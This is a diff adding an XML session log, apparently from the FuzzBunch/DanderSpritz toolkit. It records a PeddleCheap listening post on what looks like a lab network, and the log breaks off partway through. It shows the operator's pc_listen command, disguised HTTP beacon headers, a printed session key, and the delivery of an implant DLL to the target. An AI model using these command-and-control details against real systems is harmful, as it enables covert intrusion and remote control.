@@ -1,0 +1,6445 @@
+﻿<?xml version='1.1' encoding='UTF-8' ?>
+<DataLog xmlns='urn:mca:db00db84-8b5b-2141-a632b5980175d3c6' xmlns:MCA='urn:mca:db00db84-8b5b-2141-a632b5980175d3c6'>
+<Instance connectionId='90f361cd-d8cc-d041-9274a78913414633' coreVersion='1.3.0' id='671e9dbf-272a-5e42-a5e8346514dd204b' lptimestamp='2017-10-16T09:37:12'/>
+<Target addr='z0.0.0.1' arch='i386' cLibMajor='9' cLibMinor='0' cLibRevision='0' compiledArch='i386' compiledPlatform='winnt' majorVersion='5' minorVersion='1' otherVersion='3' pid='1992' platform='winnt' taskId='cd0c296a-0507-9346-bb785a92d31584ad'/>
+<Command lptimestamp='2017-10-16T09:37:12' name='pc_listen'>
+<!-- FullCommand: pc_listen -key "Default" -payload "Danderspritz" -run "memlib" -http 3005 "80 443" "TlEo:" "127.0.0.1" 12288 -autoaccept   -->
+  <SourceAddress>z0.0.0.1</SourceAddress>
+  <ResourceDir>Pc</ResourceDir>
+  <DisplayTransform>pc_listen_display.xsl</DisplayTransform>
+  <StorageTransform>pc_listen_storage.xsl</StorageTransform>
+  <Argument index='1'>-key</Argument>
+  <Argument index='2'>Default</Argument>
+  <Argument index='3'>-payload</Argument>
+  <Argument index='4'>Danderspritz</Argument>
+  <Argument index='5'>-run</Argument>
+  <Argument index='6'>memlib</Argument>
+  <Argument index='7'>-http</Argument>
+  <Argument index='8'>3005</Argument>
+  <Argument index='9'>"80 443"</Argument>
+  <Argument index='10'>TlEo:</Argument>
+  <Argument index='11'>127.0.0.1</Argument>
+  <Argument index='12'>12288</Argument>
+  <Argument index='13'>-autoaccept</Argument>
+  <Flags>
+    <CommandFlagLocal/>
+  </Flags>
+</Command>
+<CommandTasking>
+<Info lptimestamp='2017-10-16T09:37:12'>lpPeddleCheapListen:  PC_PROTOCOL_HTTP</Info>
+<Info lptimestamp='2017-10-16T09:37:12'>	Listening on HTTP proxy port 80.</Info>
+<Info lptimestamp='2017-10-16T09:37:12'>	Listening on HTTP proxy port 443.</Info>
+<Info lptimestamp='2017-10-16T09:37:12'>Waiting for connection...</Info>
+<Info lptimestamp='2017-10-16T09:37:12'>Setting Sockopt</Info>
+<Info lptimestamp='2017-10-16T09:37:13'>	Listening on [0.0.0.0]:3005.</Info>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:07'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:07'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49291</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:07'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000000
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000000</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:07'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49291</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>0</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<Info lptimestamp='2017-10-16T09:41:07'>Valid connection from 10.0.0.10 on port 80</Info>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:07'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49291</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<ConnectionReceived lptimestamp='2017-10-16T09:41:07'>
+  <Target>
+    <Address>127.0.0.1</Address>
+    <Port>1893</Port>
+  </Target>
+  <Local>
+    <Address>127.0.0.1</Address>
+    <Port>3005</Port>
+  </Local>
+</ConnectionReceived>
+<Info lptimestamp='2017-10-16T09:41:07'>Connection accepted</Info>
+<Info lptimestamp='2017-10-16T09:41:07'>Starting session...</Info>
+<Info lptimestamp='2017-10-16T09:41:07'>PC LP Version: 2.3.0</Info>
+<Info lptimestamp='2017-10-16T09:41:07'>LP...ready to send the MAGIC NUMBER</Info>
+<Info lptimestamp='2017-10-16T09:41:07'>Sending additional 185 bytes of random</Info>
+<Info lptimestamp='2017-10-16T09:41:07'>LP ...ready to receive the symmetric key</Info>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:10'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:10'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49292</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:10'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000001
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 288
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>500</BytesRead>
+  <HeaderLength>214</HeaderLength>
+  <ConnectIndex>00000001</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:10'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49292</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>1</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:10'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49292</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxyConnection_DataBytesSent lptimestamp='2017-10-16T09:41:10'>
+  <Id>0x00000f5ce59a2bc9</Id>
+  <DataSent>288</DataSent>
+  <TotalBytes>288</TotalBytes>
+</PCProxyConnection_DataBytesSent>
+<Info lptimestamp='2017-10-16T09:41:10'>LP...ready to decrypt the key</Info>
+<ImplantInfo archValue='8' compiledArchValue='8' lptimestamp='2017-10-16T09:41:10' platformValue='1'>
+  <Version>2.3.0</Version>
+  <Id>0x0000000000000000</Id>
+  <Architecture>x64</Architecture>
+  <CompiledArchitecture>x64</CompiledArchitecture>
+  <Platform>winnt</Platform>
+  <CompiledPlatform>winnt</CompiledPlatform>
+  <SessionKey>
+    <Value>9a</Value>
+    <Value>c9</Value>
+    <Value>6b</Value>
+    <Value>c2</Value>
+    <Value>ca</Value>
+    <Value>87</Value>
+    <Value>7c</Value>
+    <Value>53</Value>
+    <Value>94</Value>
+    <Value>f1</Value>
+    <Value>e5</Value>
+    <Value>dc</Value>
+    <Value>f0</Value>
+    <Value>09</Value>
+    <Value>d0</Value>
+    <Value>7e</Value>
+  </SessionKey>
+</ImplantInfo>
+<Info lptimestamp='2017-10-16T09:41:10'>Getting remote OS information</Info>
+<RemoteOsVersion arch='x64' cMajor='6' cMinor='0' cRevision='0' compiledArch='x64' compiledPlatform='winnt' lptimestamp='2017-10-16T09:41:10' major='6' minor='1' platform='winnt' revision='1'/>
+<Info lptimestamp='2017-10-16T09:41:10'>Sending OS version check status to remote side (4 bytes)</Info>
+<Info lptimestamp='2017-10-16T09:41:10'>Data (OS version check status) has been sent</Info>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:13'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:13'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49293</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:13'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000002
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 24
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>237</BytesRead>
+  <HeaderLength>213</HeaderLength>
+  <ConnectIndex>00000002</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:13'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49293</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>2</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:13'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49293</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxyConnection_DataBytesSent lptimestamp='2017-10-16T09:41:13'>
+  <Id>0x00000f5ce59a2bc9</Id>
+  <DataSent>24</DataSent>
+  <TotalBytes>24</TotalBytes>
+</PCProxyConnection_DataBytesSent>
+<Info lptimestamp='2017-10-16T09:41:13'>Data (OS version check status) has been received and stored by remote side
+</Info>
+<Info lptimestamp='2017-10-16T09:41:13'>Ready to send implant</Info>
+<Info lptimestamp='2017-10-16T09:41:13'>Successfully loaded LP DLLs
+</Info>
+<PayloadInfo checksum='5d20' fileName='C:\johnb\fuzzbunch-master-new\Resources\Pc\/../Dsz/Payloads/Files/x64-winnt-vc9s/release/Dsz_Implant_Pc.dll' lptimestamp='2017-10-16T09:41:13' origSize='338944' sendSize='166644' sendingPayload='true'/>
+<RunLibrary export='#1' flags='0x00000008' lptimestamp='2017-10-16T09:41:13' name='' path=''/>
+<Info lptimestamp='2017-10-16T09:41:13'>
+</Info>
+<Info lptimestamp='2017-10-16T09:41:13'>Sending PayloadInfo run type information</Info>
+<Info lptimestamp='2017-10-16T09:41:13'>Sending File/Library info to remote side (36 bytes)</Info>
+<Info lptimestamp='2017-10-16T09:41:13'>Data (File/Library info) has been sent</Info>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:16'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:16'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49294</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:16'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000003
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000003</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:16'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49294</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>3</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:16'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49294</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:19'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:19'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49295</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:19'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000004
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 24
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>237</BytesRead>
+  <HeaderLength>213</HeaderLength>
+  <ConnectIndex>00000004</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:19'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49295</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>4</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:19'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49295</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxyConnection_DataBytesSent lptimestamp='2017-10-16T09:41:19'>
+  <Id>0x00000f5ce59a2bc9</Id>
+  <DataSent>24</DataSent>
+  <TotalBytes>24</TotalBytes>
+</PCProxyConnection_DataBytesSent>
+<Info lptimestamp='2017-10-16T09:41:19'>Data (File/Library info) has been received and stored by remote side
+</Info>
+<Info lptimestamp='2017-10-16T09:41:19'>Sending Export name to remote side (3 bytes)</Info>
+<Info lptimestamp='2017-10-16T09:41:19'>Data (Export name) has been sent</Info>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:22'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:22'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49296</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:22'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000005
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 24
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>237</BytesRead>
+  <HeaderLength>213</HeaderLength>
+  <ConnectIndex>00000005</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:22'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49296</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>5</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:22'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49296</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxyConnection_DataBytesSent lptimestamp='2017-10-16T09:41:22'>
+  <Id>0x00000f5ce59a2bc9</Id>
+  <DataSent>24</DataSent>
+  <TotalBytes>24</TotalBytes>
+</PCProxyConnection_DataBytesSent>
+<Info lptimestamp='2017-10-16T09:41:22'>Data (Export name) has been received and stored by remote side
+</Info>
+<Info lptimestamp='2017-10-16T09:41:22'>Sending Payload to remote side (166644 bytes)</Info>
+<Info lptimestamp='2017-10-16T09:41:22'>Data (Payload) has been sent</Info>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:25'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:25'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49297</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:25'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000006
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000006</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:25'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49297</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>6</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:25'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49297</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:28'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:28'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49298</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:28'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000007
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000007</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:28'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49298</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>7</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:28'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49298</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:30'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:30'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49299</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:30'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000008
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000008</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:30'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49299</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>8</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:30'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49299</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:33'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:33'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49300</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:33'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000009
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000009</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:33'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49300</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>9</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:33'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49300</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:36'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:36'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49301</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:36'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000000a
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000000a</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:36'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49301</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>10</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:36'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49301</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:39'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:39'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49302</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:39'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000000b
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000000b</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:39'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49302</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>11</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:39'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49302</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:42'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:42'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49303</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:42'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000000c
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000000c</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:42'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49303</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>12</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:42'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49303</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:45'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:45'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49304</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:45'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000000d
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000000d</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:41:45'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49304</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>13</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:41:45'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49304</Port>
+  </Target>
+  <Id>0x00000f5ce59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:41:48'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:41:48'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49305</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:41:48'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
